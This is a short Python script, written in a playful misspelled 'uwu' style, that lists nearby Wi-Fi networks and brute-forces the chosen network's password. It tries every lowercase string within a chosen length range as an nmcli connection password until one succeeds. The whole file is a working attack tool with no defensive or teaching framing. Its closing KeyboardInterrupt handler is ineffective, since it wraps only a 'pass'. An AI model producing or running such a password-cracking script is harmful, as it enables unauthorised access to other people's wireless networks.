import itertools
import string
import subprocess

subprocess.run(['nmcli', 'device', 'wifi'])
network = input("Whick network to crack? (Enter full network name): ")

charset = string.ascii_lowercase
min_length = int(input("Minyamal passuwurd lenght? (Enter int valuwue): "))
max_length = int(input("Maximal passuwurd lenght? (Enter int valuwue): "))

for length in range(min_length, max_length + 1):
    for guess in itertools.product(charset, repeat=length):
        guess_password = ''.join(guess)
        print(f'Tryaing passuwurd... {guess_password}')
        
        result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', network, 'password', guess_password], 
                                text=True, capture_output=True)
        
        if "successfully" in result.stdout:
            print(f'Passuwurd was fouwund: {guess_password}! ^~^')
            break
    else:
        continue
    break
else:
    print("Passuwurd not fouwund... >~<")

try:
    if __name__ == "__main__":
        pass
except KeyboardInterrupt:
    print("bye...")